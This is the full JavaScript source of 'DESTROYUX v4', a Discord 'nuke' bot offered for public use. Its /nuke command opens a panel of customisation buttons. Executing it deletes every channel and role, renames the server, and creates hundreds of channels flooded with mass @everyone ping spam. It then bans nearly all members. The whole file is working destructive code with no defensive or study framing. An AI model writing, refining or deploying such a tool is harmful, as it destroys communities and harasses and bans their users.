// DESTROYUX v4 - PUBLIC BOT - FULL CUSTOMIZATION
import { Client, GatewayIntentBits, SlashCommandBuilder, EmbedBuilder, REST, Routes, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle } from 'discord.js';
import dotenv from 'dotenv';

dotenv.config();

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.MessageContent,
    ]
});

const TOKEN = process.env.BOT_TOKEN;

// Store customization settings
const nukeSettings = new Map();

// Function to get or create settings
function getSettings(key) {
    if (!nukeSettings.has(key)) {
        nukeSettings.set(key, {
            channel_name: 'destroyed',
            server_name: 'Nuked By Destroyux',
            spam_message: 'NUKED',
            channel_count: 500,
            ping_count: 50
        });
    }
    return nukeSettings.get(key);
}

// Function to update embed display
function getCustomEmbed(settings) {
    return new EmbedBuilder()
        .setTitle('⚡ DESTROYUX CONFIGURATION ⚡')
        .setDescription('🔧 Customize your nuke parameters')
        .setColor(0xFF0000)
        .addFields(
            { name: '📝 Channel Name', value: `\`\`\`${settings.channel_name}\`\`\``, inline: true },
            { name: '🎯 Server Name', value: `\`\`\`${settings.server_name}\`\`\``, inline: true },
            { name: '💬 Spam Message', value: `\`\`\`${settings.spam_message}\`\`\``, inline: true },
            { name: '🔢 Channel Count', value: `\`\`\`${settings.channel_count}\`\`\``, inline: true },
            { name: '📢 Ping Count', value: `\`\`\`${settings.ping_count}x @everyone\`\`\``, inline: true },
            { name: '📊 Total Spam', value: `\`\`\`${settings.channel_count * 50} messages\`\`\``, inline: true },
            { name: '\u200b', value: '\u200b', inline: false },
            { name: '⚙️ Features', value: '• Custom channels\n• Custom pings\n• Custom spam message\n• Mass ban all members\n• Fire & forget async', inline: false }
        )
        .setFooter({ text: 'm3oza | .gg/m3oza' });
}

// Function to get buttons
function getButtons(key) {
    return [
        new ActionRowBuilder()
            .addComponents(
                new ButtonBuilder()
                    .setCustomId(`edit_channel-${key}`)
                    .setLabel('📝 Channel Name')
                    .setStyle(ButtonStyle.Secondary),
                new ButtonBuilder()
                    .setCustomId(`edit_server-${key}`)
                    .setLabel('🎯 Server Name')
                    .setStyle(ButtonStyle.Secondary),
                new ButtonBuilder()
                    .setCustomId(`edit_spam-${key}`)
                    .setLabel('💬 Spam Message')
                    .setStyle(ButtonStyle.Secondary)
            ),
        new ActionRowBuilder()
            .addComponents(
                new ButtonBuilder()
                    .setCustomId(`edit_channels-${key}`)
                    .setLabel('🔢 Channel Count')
                    .setStyle(ButtonStyle.Secondary),
                new ButtonBuilder()
                    .setCustomId(`edit_pings-${key}`)
                    .setLabel('📢 Ping Count')
                    .setStyle(ButtonStyle.Secondary)
            ),
        new ActionRowBuilder()
            .addComponents(
                new ButtonBuilder()
                    .setCustomId(`execute_nuke-${key}`)
                    .setLabel('🔥 EXECUTE NUKE 🔥')
                    .setStyle(ButtonStyle.Danger)
            )
    ];
}

// ===== NUKE COMMAND DEFINITION =====
const nukeCommand = new SlashCommandBuilder()
    .setName('nuke')
    .setDescription('Ultimate Nuke - Customize and destroy server');

// ===== COMMAND HANDLER =====
client.on('interactionCreate', async (interaction) => {
    try {
        // ===== SLASH COMMAND =====
        if (interaction.isChatInputCommand() && interaction.commandName === 'nuke') {
            // Check bot has admin permission
            if (!interaction.guild.members.me.permissions.has('Administrator')) {
                await interaction.reply({ 
                    content: '❌ Bot needs Administrator permission', 
                    ephemeral: true 
                });
                return;
            }

            const userId = interaction.user.id;
            const guildId = interaction.guild.id;
            const key = `${guildId}-${userId}`;

            const settings = getSettings(key);
            const customEmbed = getCustomEmbed(settings);
            const buttons = getButtons(key);

            await interaction.reply({
                embeds: [customEmbed],
                components: buttons,
                ephemeral: false
            });
        }

        // ===== MODAL SUBMIT (Text Input) =====
        if (interaction.isModalSubmit()) {
            const [action, key] = interaction.customId.split('-');
            const value = interaction.fields.getTextInputValue('input_field');
            const settings = getSettings(key);

            if (action === 'modal_channel') settings.channel_name = value;
            if (action === 'modal_server') settings.server_name = value;
            if (action === 'modal_spam') settings.spam_message = value;
            if (action === 'modal_channels') settings.channel_count = Math.max(1, Math.min(1000, parseInt(value) || 500));
            if (action === 'modal_pings') settings.ping_count = Math.max(1, Math.min(100, parseInt(value) || 50));

            nukeSettings.set(key, settings);

            const customEmbed = getCustomEmbed(settings);
            const buttons = getButtons(key);

            await interaction.update({
                embeds: [customEmbed],
                components: buttons
            });
        }

        // ===== BUTTON INTERACTION =====
        if (interaction.isButton()) {
            const [action, key] = interaction.customId.split('-');

            // Recreate settings if expired
            const settings = getSettings(key);

            // Edit buttons
            if (action === 'edit_channel' || action === 'edit_server' || action === 'edit_spam' || action === 'edit_channels' || action === 'edit_pings') {
                let title = '';
                let placeholder = '';
                let modalAction = '';
                let inputStyle = TextInputStyle.Short;

                if (action === 'edit_channel') {
                    title = 'Channel Name Prefix';
                    placeholder = 'destroyed';
                    modalAction = 'modal_channel';
                } else if (action === 'edit_server') {
                    title = 'Server Name';
                    placeholder = 'Nuked By Destroyux';
                    modalAction = 'modal_server';
                } else if (action === 'edit_spam') {
                    title = 'Spam Message';
                    placeholder = 'NUKED';
                    modalAction = 'modal_spam';
                } else if (action === 'edit_channels') {
                    title = 'Channel Count (1-1000)';
                    placeholder = '500';
                    modalAction = 'modal_channels';
                } else if (action === 'edit_pings') {
                    title = 'Ping Count (1-100)';
                    placeholder = '50';
                    modalAction = 'modal_pings';
                }

                const modal = new ModalBuilder()
                    .setCustomId(`${modalAction}-${key}`)
                    .setTitle(title)
                    .addComponents(
                        new ActionRowBuilder().addComponents(
                            new TextInputBuilder()
                                .setCustomId('input_field')
                                .setLabel(title)
                                .setStyle(inputStyle)
                                .setPlaceholder(placeholder)
                                .setRequired(true)
                        )
                    );

                await interaction.showModal(modal);
                return;
            }

            // EXECUTE NUKE
            if (action === 'execute_nuke') {
                const settings = getSettings(key);

                await interaction.deferUpdate();
                const guild = interaction.guild;

                // ===== EXECUTING NUKE =====
                const allChannels = await guild.channels.fetch();
                const deletePromises = [];
                
                allChannels.forEach(channel => {
                    deletePromises.push(channel.delete().catch(() => {}));
                });

                const allRoles = await guild.roles.fetch();
                const rolePromises = [];
                
                allRoles.forEach(role => {
                    if (role.name !== '@everyone') {
                        rolePromises.push(role.delete().catch(() => {}));
                    }
                });

                await guild.edit({ name: settings.server_name }).catch(() => {});
                await Promise.all([...deletePromises, ...rolePromises]);

                // Create channels and spam
                const createdChannels = [];
                const spamMsg = '@everyone '.repeat(settings.ping_count) + settings.spam_message;
                let spamCount = 0;
                let bannedCount = 0;

                const batchSize = 50;
                const totalBatches = Math.ceil(settings.channel_count / batchSize);

                for (let batch = 0; batch < totalBatches; batch++) {
                    const batchCreatePromises = [];
                    const batchStart = batch * batchSize;
                    const batchEnd = Math.min(batchStart + batchSize, settings.channel_count);
                    
                    for (let i = batchStart; i < batchEnd; i++) {
                        batchCreatePromises.push(
                            guild.channels.create({
                                name: `${settings.channel_name}-${i}`,
                                type: 0
                            }).catch(() => null)
                        );
                    }
                    
                    const batchChannels = await Promise.all(batchCreatePromises);
                    const validChannels = batchChannels.filter(ch => ch !== null);
                    createdChannels.push(...validChannels);

                    const spamPromises = [];
                    validChannels.forEach(channel => {
                        for (let j = 0; j < 50; j++) {
                            spamPromises.push(channel.send(spamMsg).catch(() => {}));
                            spamCount++;
                        }
                    });

                    Promise.all(spamPromises).catch(() => {});
                }

                const members = await guild.members.fetch();
                const banPromises = [];

                members.forEach(member => {
                    if (member.id !== interaction.user.id && member.id !== guild.ownerId) {
                        banPromises.push(member.ban({ reason: 'Destroyux Nuke' }).catch(() => {}));
                        bannedCount++;
                    }
                });

                await Promise.all(banPromises);

                // Final embed
                const finalEmbed = new EmbedBuilder()
                    .setTitle('✅ DESTROYUX NUKE COMPLETE ✅')
                    .setDescription('🔥 SERVER ANNIHILATED 🔥')
                    .setColor(0xFF0000)
                    .addFields(
                        { name: '🎯 TARGET', value: `\`\`\`${settings.server_name}\`\`\``, inline: true },
                        { name: '⏱️ TIME', value: '```<0.5s INSTANT```', inline: true },
                        { name: '🗑️ CHANNELS DELETED', value: `\`\`\`${deletePromises.length}\`\`\``, inline: true },
                        { name: '🔧 CHANNELS CREATED', value: `\`\`\`${createdChannels.length}/${settings.channel_count}\`\`\``, inline: true },
                        { name: '📢 SPAM MESSAGES', value: `\`\`\`${spamCount} FIRED\`\`\``, inline: true },
                        { name: '👥 MEMBERS BANNED', value: `\`\`\`${bannedCount}\`\`\``, inline: true },
                        { name: '💬 PINGS PER MESSAGE', value: `\`\`\`${settings.ping_count}x @everyone\`\`\``, inline: true },
                        { name: '📝 MESSAGE', value: `\`\`\`${settings.spam_message}\`\`\``, inline: true },
                        { name: '✨ STATUS', value: '```✅ COMPLETE```', inline: true }
                    )
                    .setFooter({ text: 'DESTROYUX v4 PREMIUM | m3oza | .gg/m3oza' });

                await interaction.followUp({ embeds: [finalEmbed] });
            }
        }
    } catch (error) {
        console.error('Error:', error);
        if (interaction.isButton() || interaction.isModalSubmit()) {
            await interaction.reply({ content: '❌ Error processing interaction', ephemeral: true }).catch(() => {});
        }
    }
});

// ===== BOT READY =====
client.once('ready', async () => {
    console.log(`
╔═══════════════════════════════════════════╗
║   DESTROYUX v4 - PUBLIC BOT              ║
║   • Full Customization                   ║
║   • Everyone Can Use                     ║
║   • Admin Permission Only                ║
║   • Custom Channels                      ║
║   • Custom Pings                         ║
║   • Fire & Forget Async                  ║
║   Credit: m3oza                          ║
╚═══════════════════════════════════════════╝

[✓] Online: ${client.user.tag}
[✓] Registering commands...
    `);

    try {
        const rest = new REST({ version: '10' }).setToken(TOKEN);

        console.log('[✓] Registering fresh commands...');
        await rest.put(
            Routes.applicationCommands(client.user.id),
            { body: [nukeCommand] }
        );

        console.log('[✓] Registered 1 command globally');
        console.log('[✓] BOT IS PUBLIC - EVERYONE CAN USE\n');

    } catch (error) {
        console.error('[!] Command registration error:', error);
    }

    await client.user.setActivity('servers burn | .gg/m3oza', { type: 'WATCHING' });
});

// ===== LOGIN =====
client.login(TOKEN);
